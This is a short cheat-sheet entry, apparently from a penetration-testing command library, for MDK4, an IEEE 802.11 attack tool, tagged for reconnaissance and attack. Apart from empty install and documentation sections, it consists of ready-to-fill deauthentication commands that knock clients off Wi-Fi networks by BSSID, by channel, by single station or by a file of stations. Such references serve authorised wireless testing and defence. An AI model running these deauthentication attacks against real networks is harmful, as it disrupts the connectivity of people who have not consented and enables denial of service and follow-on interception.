# MDK4
% wifi, MDK4
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
```

## _repo
```
https://github.com/aircrack-ng/mdk4
```

## _doc
```
```

## _install
```
```

## Deauth - bssid
```bash
sudo mdk4 <wlan_mon_interface|wmon> d -B <bssid> 
```

## Deauth - channel
```bash
sudo mdk4 <wlan_mon_interface|wmon> d -c <wlan_channel> 
```

## Deauth - station
```bash
sudo mdk4 <wlan_mon_interface|wmon> d -S <station_mac>
```

## Deauth - station (file list)
```bash
sudo mdk4 <wlan_mon_interface|wmon> d -b <station_mac_file>
```